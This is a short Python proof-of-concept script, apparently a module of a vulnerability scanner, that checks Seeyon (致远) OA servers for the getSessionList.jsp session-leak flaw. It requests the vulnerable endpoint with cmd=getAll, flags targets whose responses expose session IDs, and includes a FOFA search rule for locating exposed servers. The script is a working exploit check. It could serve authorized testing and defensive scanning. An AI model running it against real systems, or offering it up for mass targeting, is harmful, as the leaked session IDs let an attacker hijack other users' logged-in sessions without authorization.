#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests

from Config.config_proxies import proxies
from Config.config_requests import  headers

requests.packages.urllib3.disable_warnings()
# 脚本信息
######################################################
NAME='Seeyon_OA_Session_Leak'
AUTHOR="Joker"
REMARK='致远OA getSessionList.jsp Session泄漏漏洞'
FOFA_RULE='title="致远OA'
######################################################

def poc(target):
    result = {}
    vuln_url = target + "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
    try:

        r = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5,proxies=proxies)
        if "/yyoa/index.jsp" not in r.text and "<sessionID>" in r.text and r.status_code == 200:
            result['target'] = target
            result['poc'] = NAME
            result['session'] = vuln_url
            return result
    except:
        pass


if __name__ == '__main__':
    poc('https://127.0.0.1')